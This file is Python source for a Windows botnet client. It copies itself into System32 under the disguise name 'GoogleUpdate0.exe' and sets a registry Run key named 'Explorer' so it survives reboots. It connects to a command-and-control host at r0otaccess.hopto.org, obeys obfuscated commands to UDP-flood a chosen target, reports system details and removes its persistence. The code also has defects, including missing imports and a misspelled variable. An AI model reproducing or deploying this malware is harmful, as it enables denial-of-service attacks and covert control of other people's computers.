from _winreg import *
import sys
import socket
import string
import time
import threading
import os

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])-10+(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])+10-(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

global cmd
global d
global w
global s
global key
global a
global t2
global outfile

class Infect(threading.Thread):
    def run(self):
        shutil.copy(sys.argv[0],outfile)
        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"Explorer",0, REG_SZ, outfile)

class DDOS ( threading.Thread ):
    def run ( self ):
        self.running = True
        target = (cmd[1],cmd[2]);
        soc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
        while self.running:
            for x in range(1000):
                soc.sendto("asdsdsdsd",target);
        print 'Finished DDOSing'

    def stopMe ( self ):
        self.running = False

class Wait ( threading.Thread ):
    def run ( self ):
        time.sleep(cmd[3])
        d.stopMe()
        
class AdminConnect ( threading.Thread ):
    def run ( self ):
        self.running = True
        bigFlag = True
        while bigFlag and self.running:
            bigFlag = False
            connFlag = True
            a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while connFlag and self.running:
                try:
                    a.connect(('r0otaccess.hopto.org', 8888))
                    connFlag = False
                except:
                    print "Trying to connect to r0ot_ in 2 seconds"
                time.sleep(2)
                
            flag = True
            while flag and self.running:
                try:
                    cmd = a.recv(10000)
                    cmd = dec(cmd, key)
                    cmd = cmd.split(" ")
                    if cmd[0] == 'test':
                        print "Test command recieved successfully :)"
                    elif cmd[0] == 'ddos':
                        cmd[2] = int(cmd[2])
                        cmd[3] = int(cmd[3])
                        print "DDOSing " + str(cmd[1]) + " on port " + str(cmd[2])
                        d = DDOS()
                        w = Wait()
                        w.start()
                        d.start()
                    elif cmd[0] == 'clean':
                        flag = False
                        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
                        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                        try:
                            DeleteValue(aKey, "Explorer")
                            print "Cleaned: 1 second"
                        except:
                            print "Cleaned: 1 second"
                        time.sleep(1)
                    elif cmd[0] == 'info':
                        s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
                except:
                    flag = False
                    bigFlag = True

    def stopMe ( self ):
        self.running = False

class ClientConnect ( threading.Thread ):
    def run ( self ):
        bigFlag = True
        while bigFlag:
            bigFlag = False
            connFlag = True
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while connFlag:
                try:
                    s.connect(('127.0.0.1', 8888))
                    connFlag = False
                except:
                    print "Trying to connect to client in 2 second"
                time.sleep(2)
                
            flag = True
            while flag:
                try:
                    cmd = s.recv(10000)
                    cmd = dec(cmd, key)
                    cmd = cmd.split(" ")
                    if cmd[0] == 'test':
                        print "Test command recieved successfully :)"
                    elif cmd[0] == 'ddos':
                        cmd[2] = int(cmd[2])
                        cmd[3] = int(cmd[3])
                        print "DDOSing " + str(cmd[1]) + " on port " + str(cmd[2])
                        d = DDOS()
                        w = Wait()
                        w.start()
                        d.start()
                    elif cmd[0] == 'clean':
                        flag = False
                        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
                        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                        try:
                            DeleteValue(aKey, "Explorer")
                            print "Cleaned: 1 second"
                        except:
                            print "Cleaned: 1 second"
                        time.sleep(1)
                    elif cmd[0] == 'info':
                        s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
                except:
                    flag = False
                    bigFlag = True

key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"
outfile = os.getcwd()[0]
outfile = outfile + ":\Windows\System32\GoogleUpdate0.exe"
eheck = os.getcwd()[0]
check = check + ":\Windows\System32"
if os.path.isdir(check) == True:
    outfile = os.getcwd()[0]
    outfile = outfile + ":\Windows\System32\GoogleUpdate0.exe"
else:
    outfile = "C:\Windows\System32\GoogleUpdate0.exe"

if os.path.isfile(outfile) == False:
    Infect().start()
else:
    print "\nComputer is already infected"

t1 = ClientConnect()
t1.start()
t2 = AdminConnect()
t2.start()
